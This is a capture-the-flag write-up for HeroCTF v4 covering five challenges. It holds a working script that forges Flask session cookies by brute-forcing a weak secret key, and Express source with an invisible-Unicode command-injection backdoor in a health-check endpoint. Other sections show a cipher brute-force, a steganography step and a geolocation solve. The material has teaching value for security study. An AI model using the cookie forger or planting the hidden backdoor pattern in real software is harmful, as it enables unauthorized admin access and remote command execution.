# HeroCTF v4 2022

### SmallMistakeBigMistake

![](https://i.imgur.com/d9FybDK.png)

given below code

```python
#!/usr/bin/env python
from flask import Flask, session, render_template

from string import hexdigits
from random import choice
from os import getenv


app = Flask(__name__)
app.secret_key = choice(hexdigits) * 32


@app.route("/", methods=["GET"])
def index():
    flag = "You are not admin !"
    if session and session["username"] == "admin":
        flag = getenv("FLAG")

    return render_template("index.html", flag=flag)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(getenv("PORT")))
```
and

![](https://i.imgur.com/VRRdTlD.png)
```python
from flask import Flask, session, render_template

from string import hexdigits
from random import choice
from os import getenv
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import requests

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    # Override method
    # Take secret_key instead of an instance of a Flask app
    def get_signing_serializer(self, secret_key):
        if not secret_key:
            return None
        signer_kwargs = dict(key_derivation=self.key_derivation, digest_method=self.digest_method)
        return URLSafeTimedSerializer(secret_key, salt=self.salt, serializer=self.serializer, signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.dumps(cookieDict)

# solution:
for a in (hexdigits):
    secret_key = a*32 
    cookie=encodeFlaskCookie(secret_key,  {u'username':'admin'})
    r =requests.get('https://smallbigmistake.web.heroctf.fr/', cookies={"session":cookie})
    print(r.text)
```
inorder for us to pass the cookie (as username:admin) we need to first sign it using flask, so we looped over each letter (example: a* 32)
>Hero{Sm4ll_Mist4ke_c4n_be_d4ngerous_10853085}

---

### where backdoor - web
![](https://i.imgur.com/XLYfsmd.png)

notices there was in /assets/ a zip file with source.zip
```
USE user_db;

CREATE TABLE IF NOT EXISTS USERS (
    id INT PRIMARY KEY,
    name VARCHAR(255),
    password VARCHAR(255)
);

INSERT INTO USERS VALUES (1, "user1", "dummyPass1");
INSERT INTO USERS VALUES (2, "user2", "dummyPass2");
```
and
```
const express = require('express');
const util = require('util');
const cors = require('cors');
const mysql = require('mysql');
const exec = util.promisify(require('child_process').exec);

const app = express();

var corsOptions = {
    origin: '*',
    optionsSuccessStatus: 200
  }
  
app.get('/test', cors(corsOptions), function (req, res) {
    const { param } = req.query;
    res.status(200).send('This is a test GET endpoint\nPARAM: '+(param || "empty"));
})

app.get("/db_connection", cors(corsOptions), async (req, res) => {
    
    const con = mysql.createConnection({
        host: "localhost",
        user: "player",
        password: "REDACTED",
        database: "user_db"
    });
    
    con.connect(function(err) {
        if (err) {
            res.status(500).send("MYSQL: connection error");
        } else {
            con.query("SELECT * FROM USERS", function (err, result, fields) {
                if (err) {
                    res.status(500).send("MYSQL: request error");
                } else {
                    output = "|===== user_db =====|\n|  USER | PASSWORD  |\n|------------------------|\n";
                    result.forEach(element => {
                        output += "| "+element.name + " | " + element.password + " |\n";
                    });
                    output+="|=================|"
                    res.status(200).send(output.trim());
                }
              });
        }
    });
});

app.get('/server_health', cors(corsOptions), async (req, res) => {
    var { timeout,ㅤ} = req.query;
    const checkCommands = [
        '/bin/bash /home/player/scripts/fileIntegrity.sh',
        '/bin/bash /home/player/scripts/isUp.sh localhost:80',
        '/bin/bash /home/player/scripts/isUp.sh localhost:3000',ㅤ
    ];

    var t = 0;
    if (timeout != "") {
        t = parseInt(t);
    }

    try {
        output = ""
        await Promise.all(checkCommands.map(async (cmd) => {
            try {
                r = await exec(cmd, { timeout: t });
                output += r.stdout.trim() || r.stderr.trim();
            } catch (err) {
                output += "";
            }
            output += "\n"
        }));
        res.status(200);
        res.send(output.trim());
    } catch(e) {
        res.status(500);
        res.send('Server status : ERROR');
    }
});

app.listen(3000);
```

we notice we can do javascript destructuring here by using "ㅤ" (second argument in the var { timeout,ㅤ} = req.query;)

```
app.get('/server_health', cors(corsOptions), async (req, res) => {
    var { timeout,ㅤ} = req.query;
    const checkCommands = [
        '/bin/bash /home/player/scripts/fileIntegrity.sh',
        '/bin/bash /home/player/scripts/isUp.sh localhost:80',
        '/bin/bash /home/player/scripts/isUp.sh localhost:3000',ㅤ
    ];
```
![](https://i.imgur.com/RAZ4IvA.png)

![](https://i.imgur.com/yc7ZBzk.png)

![](https://i.imgur.com/o0ZoYdx.png)

>Hero{1nv1s1b1e_b4ckd0or_w7f}

---

### Poly321

![](https://i.imgur.com/30o0tYa.png)

```python=
#!/usr/bin/env python3
FLAG = "****************************"
"""
$ python3 encrypt.py
[378504, 1040603, 1494654, 1380063, 1876119, 1574468, 1135784, 1168755, 1534215, 866495, 1168755, 1534215, 866495, 1657074, 1040603, 1494654, 1786323, 866495, 1699439, 1040603, 922179, 1236599, 866495, 1040603, 1343210, 980199, 1494654, 1786323, 1417584, 1574468, 1168755, 1380063, 1343210, 866495, 188499, 127550, 178808, 135303, 151739, 127550, 112944, 178808, 1968875]
"""
enc = []
for c in FLAG:
    v = ord(c)

    enc.append(
        v + pow(v, 2) + pow(v, 3)
    )

# solution:

enFLAG = [378504, 1040603, 1494654, 1380063, 1876119, 1574468, 1135784, 1168755, 1534215, 866495, 1168755, 1534215, 866495, 1657074, 1040603, 1494654, 1786323, 866495, 1699439, 1040603, 922179, 1236599, 866495, 1040603, 1343210, 980199, 1494654, 1786323, 1417584, 1574468, 1168755, 1380063, 1343210, 866495, 188499, 127550, 178808, 135303, 151739, 127550, 112944, 178808, 1968875]

# map letters to ciphertext
letters='1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_!@#$%^&*(){}'
encLETTERS = []
for a in letters:
    v = ord(a)
    encLETTERS.append([v + pow(v, 2) + pow(v, 3) , a])
    
dec = []
for x in enFLAG:
    for y in encLETTERS:
    	if(x==y[0]):
    	    print(y[1], end='')
```
so what i wrote is that i mapped all letters, digits and symbols to a number and then i checked the array that i had if existed and printed the letter instead.

> Hero{this_is_very_weak_encryption_92835208}

---

### Colorz

using stegsolve 

![](https://i.imgur.com/vxmn0bY.png)

>HERO{FL4GZ}

---

### HeroGuessr#1 

![](https://i.imgur.com/JWEdSgO.png)

given this website with google view of a location 

![](https://i.imgur.com/vKJ9ulY.jpg)

i searched for "plage de portissol" and "center ville" and "france" in google maps

![](https://i.imgur.com/cPIYg91.png)
![](https://i.imgur.com/ddPBVYp.png)
![](https://i.imgur.com/bc7f7w6.png)

i tried close parck but didnt work but then i noitced it was "parc" and not "park" in the challenge description, so i zoomed out and found the below: 

![](https://i.imgur.com/ypi2qaT.png)

>Hero{Parc Victorin Blanc}


